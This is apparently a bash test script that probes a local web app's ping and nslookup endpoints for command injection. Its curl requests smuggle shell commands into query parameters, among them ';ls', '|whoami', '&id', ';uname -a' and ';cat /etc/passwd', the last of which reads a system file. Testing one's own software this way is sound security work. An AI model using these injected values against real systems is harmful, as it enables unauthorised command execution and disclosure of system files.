#!/bin/bash

# Command Injection Vulnerability Test Script
BASE_URL="http://localhost:5000"

echo "========================================="
echo "Command Injection Vulnerability Tests"
echo "========================================="

# Test 1: Basic ping
echo -e "\n[TEST 1] Normal ping request"
curl "$BASE_URL/tools/ping?host=127.0.0.1"

# Test 2: Command injection with semicolon
echo -e "\n\n[TEST 2] Command injection: ; ls"
curl "$BASE_URL/tools/ping?host=127.0.0.1;ls"

# Test 3: Command injection with pipe
echo -e "\n\n[TEST 3] Command injection: | whoami"
curl "$BASE_URL/tools/ping?host=127.0.0.1|whoami"

# Test 4: Command injection with ampersand
echo -e "\n\n[TEST 4] Command injection: & id"
curl "$BASE_URL/tools/ping?host=127.0.0.1&id"

# Test 5: File reading via command injection
echo -e "\n\n[TEST 5] Command injection: ; cat /etc/passwd"
curl "$BASE_URL/tools/ping?host=127.0.0.1;cat%20/etc/passwd"

# Test 6: DNS lookup with command injection
echo -e "\n\n[TEST 6] DNS lookup with command injection"
curl "$BASE_URL/tools/nslookup?domain=google.com;uname%20-a"

echo -e "\n✅ Command injection tests completed"
